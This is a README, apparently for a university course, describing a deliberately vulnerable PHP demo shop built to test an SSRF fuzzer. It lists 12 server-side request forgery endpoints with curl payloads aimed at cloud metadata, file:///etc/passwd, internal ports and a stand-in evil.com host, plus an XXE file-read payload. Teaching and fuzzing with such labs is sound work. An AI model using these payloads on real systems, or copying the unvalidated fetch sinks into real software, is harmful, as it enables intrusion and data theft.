# SSRF Vulnerabilities Map - SSRFuzzShop

## Tổng quan

Web application demo cho NT213 - Bảo mật web và ứng dụng.

- **Tổng số lỗ hổng SSRF:** 12 endpoints
- **Files chứa SSRF:** 5 files (product.php, profile.php, contact.php, checkout.php, admin_products.php)
- **PHP sinks sử dụng:** 10 loại khác nhau
- **Công cụ testing:** SSRFuzz (IEEE S&P 2024)
- **Crawlergo compatible:** Tất cả parameters đều discoverable

---

## Chi tiết SSRF Vulnerabilities

### 1. product.php - 2 vulnerabilities

#### Vuln #1: Load External Image
- **Sink:** `file_get_contents()`
- **Parameter:** GET `load_image`
- **Test:** `?id=1&load_image=http://169.254.169.254/latest/meta-data/`

#### Vuln #2: Check Product API
- **Sink:** `curl_exec()`
- **Parameter:** GET `check_api`
- **Test:** `?id=1&check_api=http://localhost:8080/admin`

---

### 2. profile.php - 2 vulnerabilities

#### Vuln #3: Upload Avatar from URL
- **Sink:** `getimagesize()` + `file_get_contents()`
- **Parameter:** POST `avatar_url`
- **Test:** `curl -X POST http://localhost/profile.php -d "avatar_url=http://metadata.google.internal/"`

#### Vuln #4: Import Profile JSON
- **Sink:** `file_get_contents()` + `json_decode()`
- **Parameter:** POST `import_json`
- **Test:** `curl -X POST http://localhost/profile.php -d "import_json=http://internal-api/data.json"`

---

### 3. contact.php - 3 vulnerabilities

#### Vuln #5: Attach File from URL
- **Sink:** `readfile()`
- **Parameter:** POST `attachment_url`
- **Test:** `curl -X POST http://localhost/contact.php -d "attachment_url=file:///etc/passwd"`

#### Vuln #6: External Verification Service
- **Sink:** `file()`
- **Parameter:** POST `verify_captcha`
- **Test:** `curl -X POST http://localhost/contact.php -d "verify_captcha=http://captcha-api.internal/verify"`

#### Vuln #7: Webhook Notification
- **Sink:** `curl_exec()` (POST)
- **Parameter:** POST `webhook`
- **Test:** `curl -X POST http://localhost/contact.php -d "webhook=http://webhook.site/xxx"`

---

### 4. checkout.php - 3 vulnerabilities

#### Vuln #8: Payment Gateway Verify
- **Sink:** `get_headers()`
- **Parameter:** GET `payment_verify`
- **Test:** `?payment_verify=http://internal-payment-gateway:9200/_cluster/health`

#### Vuln #9: Shipping Rate API
- **Sink:** `fsockopen()`
- **Parameter:** POST `shipping_api`
- **Test:** `curl -X POST http://localhost/checkout.php -d "shipping_api=http://127.0.0.1:6379/"`

#### Vuln #10: Order Webhook (Blind SSRF)
- **Sink:** `file_get_contents()` + stream_context (POST)
- **Parameter:** POST `order_webhook`
- **Test:** `curl -X POST http://localhost/checkout.php -d "order_webhook=http://burpcollaborator.net/notify"`

---

### 5. admin_products.php - 2 vulnerabilities

#### Vuln #11: Validate Image/XML
- **Sink:** `simplexml_load_file()` / `imagecreatefromstring()`
- **Parameter:** POST `validate_image`
- **Test (XXE):** `curl -X POST http://localhost/admin_products.php -d "validate_image=http://evil.com/xxe.xml"`
- **Test (Image):** `curl -X POST http://localhost/admin_products.php -d "validate_image=http://internal-storage/secret.png"`

#### Vuln #12: Import Products
- **Sink:** `file_get_contents()` + `json_decode()`
- **Parameter:** POST `import_url`
- **Test:** `curl -X POST http://localhost/admin_products.php -d "import_url=http://localhost:8000/admin/export.json"`

---

## SSRF Sinks Coverage

| Sink Function | Files | Status |
|--------------|-------|--------|
| `file_get_contents()` | product.php, profile.php, admin_products.php, checkout.php | ✅ |
| `curl_exec()` | product.php, contact.php | ✅ |
| `getimagesize()` | profile.php | ✅ |
| `readfile()` | contact.php | ✅ |
| `file()` | contact.php | ✅ |
| `get_headers()` | checkout.php | ✅ |
| `fsockopen()` | checkout.php | ✅ |
| `simplexml_load_file()` | admin_products.php | ✅ |
| `imagecreatefromstring()` | admin_products.php | ✅ |
| Stream context POST | checkout.php | ✅ |

**Coverage:** 10/86 sinks từ SSRFuzz research (11.6%)

---

## Test Cases

### Case 1: AWS Metadata SSRF
```bash
curl "http://localhost/product.php?id=1&load_image=http://169.254.169.254/latest/meta-data/"
```

### Case 2: Port Scanning
```bash
curl -X POST http://localhost/checkout.php -d "shipping_api=http://127.0.0.1:22/"
```

### Case 3: XXE Attack
```bash
# Tạo xxe.xml
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF

# Test
curl -X POST http://localhost/admin_products.php -d "validate_image=http://localhost:8000/xxe.xml"
```

### Case 4: Local File Read
```bash
curl "http://localhost/product.php?id=1&load_image=file:///etc/passwd"
```

---

## Crawlergo Discovery

Tất cả 12 parameters đều có trong HTML:

| File | Parameter | Method | Discovery |
|------|-----------|--------|-----------|
| product.php | load_image | GET | Visible input |
| product.php | check_api | GET | Visible input |
| profile.php | avatar_url | POST | Visible input |
| profile.php | import_json | POST | Hidden input |
| contact.php | attachment_url | POST | Hidden input |
| contact.php | verify_captcha | POST | Hidden input |
| contact.php | webhook | POST | Hidden input |
| checkout.php | payment_verify | GET | Visible link |
| checkout.php | shipping_api | POST | Hidden input |
| checkout.php | order_webhook | POST | Hidden input |
| admin_products.php | validate_image | POST | Visible input |
| admin_products.php | import_url | POST | Visible input |

**Discovery rate: 12/12 (100%)**

---

## References

- **SSRFuzz Paper:** IEEE S&P 2024 - "Where URLs Become Weapons"
- **GitHub:** https://github.com/SSRFuzz/SSRFuzz
- **TaintInfer:** https://github.com/SSRFuzz/TaintInfer

---

## Disclaimer

**CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP!**

Các lỗ hổng được thêm cố ý để nghiên cứu fuzzing. KHÔNG deploy lên production.

---

**Generated for:** NT213 - Web & Application Security  
**Date:** December 2025
